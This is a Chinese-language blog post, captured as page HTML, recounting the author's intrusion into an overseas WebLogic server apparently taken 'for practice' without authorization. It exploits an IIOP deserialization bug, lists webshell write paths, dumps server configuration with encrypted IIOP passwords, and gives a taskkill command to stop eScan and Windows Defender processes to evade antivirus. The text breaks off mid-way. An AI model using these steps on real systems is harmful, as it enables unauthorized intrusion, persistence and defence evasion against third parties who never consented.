@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"chaserw.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言因上次攻防开局拿下weblogic主机权限，但由于默认写shell路径更改导致无法进一步利用，直到快结束时才找到正确路径写入shell，但为时已晚，只得匆匆拿下几台主机草草了事。最近刚好有空就找了台境外weblogic主机练手，过程稍微有点曲折，先后经历了尝试各种路径失败，中途主机还下线了，好在第二天又重新上线，再到绕过杀软文件监控上传webshell，总算是成功了，最后把过程记录一下。 正文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次曲折的weblogic上传webshell">
+<meta property="og:url" content="http://chaserw.github.io/2021/11/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84weblogic%E4%B8%8A%E4%BC%A0webshell/index.html">
+<meta property="og:site_name" content="chaser&#39;s Blog">
+<meta property="og:description" content="前言因上次攻防开局拿下weblogic主机权限，但由于默认写shell路径更改导致无法进一步利用，直到快结束时才找到正确路径写入shell，但为时已晚，只得匆匆拿下几台主机草草了事。最近刚好有空就找了台境外weblogic主机练手，过程稍微有点曲折，先后经历了尝试各种路径失败，中途主机还下线了，好在第二天又重新上线，再到绕过杀软文件监控上传webshell，总算是成功了，最后把过程记录一下。 正文">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic10.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic12.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic13.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic14.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic15.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic16.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic17.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic18.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic19.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic20.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic21.png">
+<meta property="article:published_time" content="2021-11-05T04:46:49.000Z">
+<meta property="article:modified_time" content="2021-11-05T05:01:30.403Z">
+<meta property="article:author" content="chaser">
+<meta property="article:tag" content="WebLogic">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="WebShell">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic1.png">
+
+<link rel="canonical" href="http://chaserw.github.io/2021/11/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84weblogic%E4%B8%8A%E4%BC%A0webshell/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>记一次曲折的weblogic上传webshell | chaser's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <script src="/live2d-widget/autoload.js"></script>
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">chaser's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/chaserw" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://chaserw.github.io/2021/11/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84weblogic%E4%B8%8A%E4%BC%A0webshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="chaser">
+      <meta itemprop="description" content="文档工程师 摸鱼砖家">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chaser's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          记一次曲折的weblogic上传webshell
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-05 12:46:49 / 修改时间：13:01:30" itemprop="dateCreated datePublished" datetime="2021-11-05T12:46:49+08:00">2021-11-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>因上次攻防开局拿下weblogic主机权限，但由于默认写shell路径更改导致无法进一步利用，直到快结束时才找到正确路径写入shell，但为时已晚，只得匆匆拿下几台主机草草了事。最近刚好有空就找了台境外weblogic主机练手，过程稍微有点曲折，先后经历了尝试各种路径失败，中途主机还下线了，好在第二天又重新上线，再到绕过杀软文件监控上传webshell，总算是成功了，最后把过程记录一下。</p>
+<h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><p>利用工具检测，发现存在weblogic iiop反序列化命令执行漏洞</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic1.png"></p>
+<p>开局是administrator权限，权限比较高，能干的事情应该挺多的</p>
+<p>dir看一下文件</p>
+<span id="more"></span>
+
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic2.png"></p>
+<blockquote>
+<p>看到pcxx.vbs和pxx.vbs，发现更早就有人光顾过了</p>
+</blockquote>
+<p>上传webshell，需要关注servers文件夹</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic3.png"></p>
+<p>在这里踩了第一个坑，AdminServer是weblogic默认存在的目录，一开始写shell都是往<code>AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\</code>目录写，发现访问不到，目录下也没写进去的文件。尝试写了个txt进去，发现写入成功，但是访问不到。然后换了<code>_WL_internal</code>目录下其他几个文件夹尝试，发现都是一样的结果。</p>
+<p>然后去搜了下weblogic写shell的文章，找到了几种路径，这里贴一下：</p>
+<h5 id="weblogic写shell路径1：写入console-images目录"><a href="#weblogic写shell路径1：写入console-images目录" class="headerlink" title="weblogic写shell路径1：写入console images目录"></a>weblogic写shell路径1：写入console images目录</h5><blockquote>
+<p>shell物理路径：</p>
+<p><code>\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code></p>
+<p>访问路径：</p>
+<p><code>/console/framework/skins/wlsconsole/images/shell.jsp</code></p>
+</blockquote>
+<p>这个shell不是写在AdminServer下，但是需要能访问到console，本环境无法访问console</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic4.png"></p>
+<h5 id="weblogic写shell路径2：写入uddiexplorer目录"><a href="#weblogic写shell路径2：写入uddiexplorer目录" class="headerlink" title="weblogic写shell路径2：写入uddiexplorer目录"></a>weblogic写shell路径2：写入uddiexplorer目录</h5><blockquote>
+<p>shell物理路径：</p>
+<p><code>\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\随机字符\war\shell.jsp</code></p>
+<p>访问路径：</p>
+<p><code>/uddiexplorer/shell.jsp</code></p>
+</blockquote>
+<p>这里写入之后可以看到写入成功，但无法访问，具体原因后边会讲到</p>
+<h5 id="weblogic写shell路径3：写入应用安装目录"><a href="#weblogic写shell路径3：写入应用安装目录" class="headerlink" title="weblogic写shell路径3：写入应用安装目录"></a>weblogic写shell路径3：写入应用安装目录</h5><blockquote>
+<p>shell物理路径：</p>
+<p><code>\Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\项目名\随机字符\war\shell.jsp</code></p>
+<p>访问路径：</p>
+<p><code>/项目名/shell.jsp</code></p>
+</blockquote>
+<p>本环境中<code>_WL_user</code>文件如下：</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic5.png"></p>
+<p>仅一个目录访问状态时403，且写入shell后仍无法访问</p>
+<h5 id="无法访问shell原因"><a href="#无法访问shell原因" class="headerlink" title="无法访问shell原因"></a>无法访问shell原因</h5><p>这个时候无法继续下去，只能先翻翻文件，先看weblogic配置文件</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic6.png"></p>
+<p>复制出来发现以下内容</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>AdminServer<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">idle-connection-timeout</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">idle-connection-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">period-length</span>&gt;</span>200000<span class="tag">&lt;/<span class="name">period-length</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">idle-periods-until-timeout</span>&gt;</span>20<span class="tag">&lt;/<span class="name">idle-periods-until-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dgc-idle-periods-until-timeout</span>&gt;</span>21<span class="tag">&lt;/<span class="name">dgc-idle-periods-until-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ssl</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>AdminServer<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hostname-verification-ignored</span>&gt;</span>true<span class="tag">&lt;/<span class="name">hostname-verification-ignored</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">listen-port</span>&gt;</span>7002<span class="tag">&lt;/<span class="name">listen-port</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ssl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">machine</span>&gt;</span>RICL2019<span class="tag">&lt;/<span class="name">machine</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listen-address</span>&gt;</span><span class="tag">&lt;/<span class="name">listen-address</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server-diagnostic-config</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>AdminServer<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">diagnostic-context-enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">diagnostic-context-enabled</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server-diagnostic-config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>WLS_FORMS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">complete-message-timeout</span>&gt;</span>480<span class="tag">&lt;/<span class="name">complete-message-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">idle-connection-timeout</span>&gt;</span>480<span class="tag">&lt;/<span class="name">idle-connection-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">idle-periods-until-timeout</span>&gt;</span>8<span class="tag">&lt;/<span class="name">idle-periods-until-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dgc-idle-periods-until-timeout</span>&gt;</span>9<span class="tag">&lt;/<span class="name">dgc-idle-periods-until-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">machine</span>&gt;</span>RICL2019<span class="tag">&lt;/<span class="name">machine</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listen-port</span>&gt;</span>9001<span class="tag">&lt;/<span class="name">listen-port</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cluster</span>&gt;</span>cluster_forms<span class="tag">&lt;/<span class="name">cluster</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">web-server</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>WLS_FORMS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">post-timeout-secs</span>&gt;</span>120<span class="tag">&lt;/<span class="name">post-timeout-secs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">web-server</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-iiop-user</span>&gt;</span>weblogic<span class="tag">&lt;/<span class="name">default-iiop-user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-iiop-password-encrypted</span>&gt;</span>&#123;AES&#125;U6pDyBAYQYl/4v/HTHYrsLjz9+EMrhlsMYKF7SL498M=<span class="tag">&lt;/<span class="name">default-iiop-password-encrypted</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listen-address</span>&gt;</span>RICL2019<span class="tag">&lt;/<span class="name">listen-address</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server-start</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>WLS_FORMS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">arguments</span>&gt;</span><span class="tag">&lt;/<span class="name">arguments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server-start</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jta-migratable-target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>WLS_FORMS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">user-preferred-server</span>&gt;</span>WLS_FORMS<span class="tag">&lt;/<span class="name">user-preferred-server</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">cluster</span>&gt;</span>cluster_forms<span class="tag">&lt;/<span class="name">cluster</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jta-migratable-target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>WLS_REPORTS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">complete-message-timeout</span>&gt;</span>480<span class="tag">&lt;/<span class="name">complete-message-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">idle-connection-timeout</span>&gt;</span>480<span class="tag">&lt;/<span class="name">idle-connection-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">idle-periods-until-timeout</span>&gt;</span>8<span class="tag">&lt;/<span class="name">idle-periods-until-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dgc-idle-periods-until-timeout</span>&gt;</span>9<span class="tag">&lt;/<span class="name">dgc-idle-periods-until-timeout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">machine</span>&gt;</span>RICL2019<span class="tag">&lt;/<span class="name">machine</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listen-port</span>&gt;</span>9002<span class="tag">&lt;/<span class="name">listen-port</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cluster</span>&gt;</span>cluster_reports<span class="tag">&lt;/<span class="name">cluster</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">web-server</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>WLS_REPORTS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">post-timeout-secs</span>&gt;</span>120<span class="tag">&lt;/<span class="name">post-timeout-secs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">web-server</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-iiop-user</span>&gt;</span>weblogic<span class="tag">&lt;/<span class="name">default-iiop-user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default-iiop-password-encrypted</span>&gt;</span>&#123;AES&#125;5wYyvsI3AlN8VNRYO8l9875budxba5tpNzyMdMI8uNg=<span class="tag">&lt;/<span class="name">default-iiop-password-encrypted</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listen-address</span>&gt;</span>RICL2019<span class="tag">&lt;/<span class="name">listen-address</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server-start</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>WLS_REPORTS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">arguments</span>&gt;</span><span class="tag">&lt;/<span class="name">arguments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server-start</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jta-migratable-target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>WLS_REPORTS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">user-preferred-server</span>&gt;</span>WLS_REPORTS<span class="tag">&lt;/<span class="name">user-preferred-server</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">cluster</span>&gt;</span>cluster_reports<span class="tag">&lt;/<span class="name">cluster</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jta-migratable-target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看了配置之后明白为什么访问shell会失败了：服务器一共有3个server，<code>AdminServer</code>、<code>WLS_FORMS</code>和<code>WLS_REPORTS</code>，分别开放在7002、9001和9002端口，这里进入的是9001端口，shell应该写在<code>WLS_FORMS</code>下，上边写的shell几乎都是写在AdminServer下当然访问不到啦</p>
+<h5 id="绕过杀软文件监控上传shell"><a href="#绕过杀软文件监控上传shell" class="headerlink" title="绕过杀软文件监控上传shell"></a>绕过杀软文件监控上传shell</h5><p>重新写shell到</p>
+<p><code>C:\Oracle\Middleware\user_projects\domains\ClassicDomain\servers\WLS_FORMS\tmp\_WL_internal\bea_wls_internal\ogdxbc\war\</code>目录，发现写后在文件中看不到，写入txt文件发现可以看到且能访问到</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic7.png"></p>
+<p>怀疑有杀软，tasklist查看一下进程</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic8.png"></p>
+<p>发现几个特殊进程，查一下是什么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 以下几个是MicroWorld的eScan Antivirus进程</span><br><span class="line">SafeConnect.ServiceHost.e     8700 Services                   0     19,148 K</span><br><span class="line">MWASER.EXE                    8504 Services                   0        532 K</span><br><span class="line">MWAGENT.EXE                   7216 Services                   0     16,184 K</span><br><span class="line">TRAYICOC.EXE                  5396 Console                    1     22,360 K</span><br><span class="line">escanmon.exe                  2996 Console                    1     27,156 K</span><br><span class="line"></span><br><span class="line"># 这个是Windows Defender进程</span><br><span class="line">MsMpEng.exe                   3036 Services                   0    129,208 K</span><br></pre></td></tr></table></figure>
+
+<p>尝试用taskkill干掉这些进程</p>
+<p><code>taskkill /t /f /pid 2996 /pid 5396 /pid 7216 /pid 8504 /pid 8700 /pid 3036</code></p>
+<p>发现<code>escanmon.exe</code>和<code>MsMpEng.exe</code>无法结束掉，应该是权限不够，且kill掉的进程会立即重启</p>
+<p>这时想能不能把服务关掉试试，查看服务</p>
+<p><img src="https://raw.githubusercontent.com/chaserw/pic/main/img/weblogic9.png"></p>
+<p>复制出来搜索escan发现两个服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SERVICE_NAME: eScan Monitor Service</span><br><span class="line">DISPLAY_NAME: eScan Monitor Service</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS  </span><br><span class="line">        STATE              : 4  RUNNING </span><br><span class="line">                                (NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">        WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">        SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">        CHECKPOINT         : 